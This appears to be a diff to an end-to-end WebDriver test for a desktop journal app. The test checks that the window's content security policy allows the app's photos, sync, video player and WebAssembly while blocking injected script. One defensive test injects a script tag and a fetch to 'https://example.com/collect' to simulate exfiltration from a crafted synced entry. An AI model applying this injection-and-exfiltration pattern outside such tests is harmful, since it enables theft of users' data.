@@ -69,6 +69,8 @@ const click = (s: string, el: string) => wd('POST', `/session/${s}/element/${el}
 const type = (s: string, el: string, text: string) => wd('POST', `/session/${s}/element/${el}/value`, { text });
 const run = (s: string, script: string, args: unknown[] = []) => wd('POST', `/session/${s}/execute/sync`, { script, args });
 const bodyText = (s: string): Promise<string> => run(s, 'return document.body.innerText');
+/** What the window's security policy (D104) has blocked since the app started (boot.tsx). */
+const blocked = (s: string): Promise<string[]> => run(s, 'return window.logbookBlocked ?? null');
 /** Keys for WebDriver's element/value: End. */
 const END = '';
 
@@ -81,13 +83,14 @@ function windowIcon(fx = 0.5, fy = 0.5): { sizes: number[][]; pixel: number[] } 
 /** Serious and critical accessibility problems axe finds in what `selector` matches. */
 async function axeProblems(s: string, selector: string): Promise<string[]> {
   const source = await readFile(createRequire(import.meta.url).resolve('axe-core/axe.min.js'), 'utf8');
+  // axe's source is part of the script itself: the window's security policy (D104) refuses eval.
   return wd('POST', `/session/${s}/execute/async`, {
-    script: `const done = arguments[arguments.length - 1];
-      (0, eval)(arguments[0]);
-      axe.run(document.querySelector(arguments[1]), { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa', 'wcag22aa'] } })
+    script: `${source}
+      const done = arguments[arguments.length - 1];
+      axe.run(document.querySelector(arguments[0]), { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa', 'wcag22aa'] } })
         .then((r) => done(r.violations.filter((v) => v.impact === 'serious' || v.impact === 'critical').map((v) => v.id + ': ' + v.nodes.map((n) => n.target.join(' ')).slice(0, 3).join(', '))))
         .catch((e) => done(['axe failed: ' + e]));`,
-    args: [source, selector],
+    args: [selector],
   });
 }
 
@@ -161,6 +164,8 @@ try {
   }
   check(files.some((f) => /^media\/[0-9a-z]{2}\/[0-9a-z]+\.png$/.test(f)) && files.some((f) => /^media\/[0-9a-z]{2}\/[0-9a-z]+\.meta\.json$/.test(f)), 'the photo and its details are files in media/');
   check(files.includes('logbook.json'), 'logbook.json holds the settings');
+  const firstRun = await blocked(s);
+  check(Array.isArray(firstRun) && firstRun.length === 0, `the window's security policy blocked nothing on a first run with a photo (${JSON.stringify(firstRun)})`);
   await wd('DELETE', `/session/${s}`);
 
   // ── after a restart ──
@@ -276,6 +281,35 @@ try {
   await until('the deletion', async () => (await bodyText(s)).includes('Moved to trash.'));
   await sleep(1500);
   check((await fromElsewhere()) === toldBefore, 'deleting an open entry doesn’t say another computer changed it');
+
+  // ── the window's security policy (D104) ──
+  // A video site's player as an entry's music: allowed, whether or not the site can be reached.
+  await run(s, `location.hash = '#/entry/${desk.id}'`);
+  await until('the entry in the editor', async () => (await titleNow()).startsWith('Desktop day'));
+  await click(s, await find(s, 'xpath', "//button[contains(., 'Music')]"));
+  await click(s, await until('the link button', () => find(s, 'xpath', "//button[contains(., 'Paste a link')]")));
+  await type(s, await until('the link field', () => find(s, 'css selector', 'input[placeholder^="YouTube"]')), 'https://www.youtube.com/watch?v=jfKfPfyJRdk');
+  await click(s, await find(s, 'xpath', "//button[normalize-space(.)='Play']"));
+  const player = await until('the player', () => run(s, "return document.querySelector('iframe[src*=\"youtube-nocookie.com\"]') ? true : null")).catch(() => false);
+  await sleep(1000);
+  const sessionBlocked = await blocked(s);
+  check(Boolean(player) && Array.isArray(sessionBlocked) && sessionBlocked.length === 0, `nothing the app needs is blocked: a photo, the app icon's crop, sync, the copies page, a video player (${JSON.stringify(sessionBlocked)})`);
+  // The passcode's key derivation runs WebAssembly (hash-wasm, D6): allowed. WebKit lets a module
+  // compile anyway; making an instance of it is what the policy decides.
+  const wasm = await run(s, "return WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])).then((m) => WebAssembly.instantiate(m, {})).then(() => 'runs', (e) => String(e))");
+  check(wasm === 'runs', `WebAssembly runs, for the passcode (${wasm})`);
+  // What it's for: script slipped into the page (a crafted entry from a synced folder) doesn't run,
+  // and can't send anything anywhere.
+  await run(
+    s,
+    `const tag = document.createElement('script'); tag.textContent = 'window.__injected = true'; document.body.append(tag);
+     window.__attempt = null;
+     fetch('https://example.com/collect').then(() => 'sent', () => 'refused').then((sent) => { window.__attempt = { ran: window.__injected === true, sent }; });`,
+  );
+  const attempt = await until('the attempt', () => run(s, 'return window.__attempt')).catch(() => ({ ran: undefined, sent: undefined }));
+  check(attempt.ran === false && attempt.sent === 'refused', `script slipped into the page doesn't run or send anything (${JSON.stringify(attempt)})`);
+  const reported = (await blocked(s)) ?? [];
+  check(reported.some((b) => b.startsWith('script-src')) && reported.some((b) => b.startsWith('connect-src')), `the policy says what it blocked (${JSON.stringify(reported)})`);
 
   // ── closing the window straight after typing (D86) ──
   await run(s, "location.hash = '#/new'");
